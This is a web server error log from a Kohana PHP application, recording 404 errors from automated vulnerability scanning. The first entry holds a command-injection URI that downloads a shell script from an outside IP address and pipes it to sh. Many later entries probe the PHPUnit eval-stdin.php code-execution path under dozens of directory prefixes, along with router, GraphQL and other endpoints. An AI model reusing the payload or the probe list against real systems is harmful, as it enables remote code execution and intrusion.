2025-10-29 16:56:16 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/;wget${IFS}-qO-${IFS}http:/74.194.191.52/rondo.sbx.sh|sh&echo${IFS} ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 16:56:16 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/;wget${IFS}-qO-${IFS}http:/74.194.191.52/rondo.sbx.sh|sh&echo${IFS} ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 16:56:17 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL HNAP1 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 16:56:17 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL HNAP1 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 16:56:17 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: device.rsp ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 16:56:17 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: device.rsp ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 16:56:17 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: setup.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 16:56:17 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: setup.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 16:56:17 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL user/register was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 16:56:17 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL user/register was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 17:10:31 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: hello.world ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 17:10:31 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: hello.world ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 17:10:33 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 17:10:33 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 17:10:34 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vendor/phpunit/phpunit/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 17:10:34 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vendor/phpunit/phpunit/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 17:10:34 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vendor/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 17:10:34 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vendor/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 17:10:36 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vendor/phpunit/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 17:10:36 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vendor/phpunit/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 17:10:37 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vendor/phpunit/phpunit/LICENSE/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 17:10:37 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vendor/phpunit/phpunit/LICENSE/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 17:10:38 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 17:10:38 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 17:10:39 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 17:10:39 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 17:10:40 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpunit/phpunit/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 17:10:40 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpunit/phpunit/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 17:10:41 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 17:10:41 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 17:10:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpunit/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 17:10:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpunit/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 17:10:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 17:10:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 17:10:43 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: lib/phpunit/phpunit/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 17:10:43 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: lib/phpunit/phpunit/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 17:10:44 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: lib/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 17:10:44 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: lib/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 17:10:45 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: lib/phpunit/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 17:10:45 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: lib/phpunit/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 17:10:46 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 17:10:46 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 17:10:47 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 17:10:47 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 17:10:48 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 17:10:48 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 17:10:49 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 17:10:49 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 17:10:50 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 17:10:50 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 17:10:51 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 17:10:51 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 17:10:52 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 17:10:52 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 17:10:53 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 17:10:53 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 17:10:54 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 17:10:54 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 17:10:55 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 17:10:55 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 17:10:56 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 17:10:56 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 17:10:57 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 17:10:57 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 17:10:58 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 17:10:58 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 17:10:59 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 17:10:59 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 17:11:00 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 17:11:00 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 17:11:01 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 17:11:01 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 17:11:02 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 17:11:02 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 17:19:56 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL aaa9 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 17:19:56 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL aaa9 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 17:19:56 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL aab9 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 17:19:56 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL aab9 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 18:24:48 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL developmentserver/metadatauploader was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 18:24:48 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL developmentserver/metadatauploader was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:11:02 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: hello.world ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:11:02 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: hello.world ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:10 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL p1KaLmIg2kB7fZp5 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:10 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL p1KaLmIg2kB7fZp5 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:10 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL graphql was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:10 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL graphql was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:10 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL K31aPGJK was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:10 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL K31aPGJK was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:10 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL v3/graphql was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:10 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL v3/graphql was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:10 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL v2/graphql was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:10 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL v2/graphql was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:10 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL graphql was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:10 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL graphql was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:10 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL graphiql was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:10 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL graphiql was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:10 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL v3/graphiql was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:10 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL v3/graphiql was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:10 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL v2/graphiql was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:10 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL v2/graphiql was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:10 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL sdo6mzlmsfz0 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:10 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL sdo6mzlmsfz0 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:10 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL v1/graphql was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:10 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL v1/graphql was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:11 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL v1/graphiql was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:11 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL v1/graphiql was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:11 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: ad.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:11 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: ad.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:11 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: ad.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
